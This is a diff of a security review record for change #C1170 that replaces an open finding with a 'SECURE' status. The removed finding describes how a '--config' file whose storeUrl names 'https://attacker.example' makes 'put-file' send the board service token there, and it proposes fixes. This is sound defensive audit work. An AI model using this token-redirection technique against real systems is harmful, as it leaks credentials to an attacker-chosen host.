@@ -1,5 +1,3 @@
-FINDINGS #C1170 tip 46a8da4a: S1 (medium) put-file sends the board's service token to a host the command line can choose.
-
-Before: the token and the address came from one owner-only file (the env, chmod 600), so --env /tmp/x.env could name a host but not carry the real token, and --base is refused. Now the address comes from storeUrl in the --config file (or BOARD_CONFIG), which any agent's command can point at a file it wrote: put-file shot.png --env <real env> --config /tmp/c.json with storeUrl https://attacker.example sends BOARD_SERVICE_TOKEN_ID/SECRET there. The mismatch refusal only fires when the env also has BOARD_BASE_URL, and the whole point of the change is that it often does not. Fix (pick one): (a) read storeUrl only from the owner's fixed board config (the --config path the pinned hooks name in ~/.claude/settings.json), never from argv or the environment; or (b) keep the address in the env file and have setup write BOARD_BASE_URL there. Add a test: an env with no BOARD_BASE_URL plus a --config naming another host is refused before any fetch. INFO (already true before this change): --config also picks rootsFor's folders.
+SECURE #C1170 46a8da4a (history: FINDINGS S1 raised here, the token's host could be chosen through --config): closed by d12085b9 and 5a8cffc6, both reviewed; the tip is SECURE.
 
 signed-by: Security
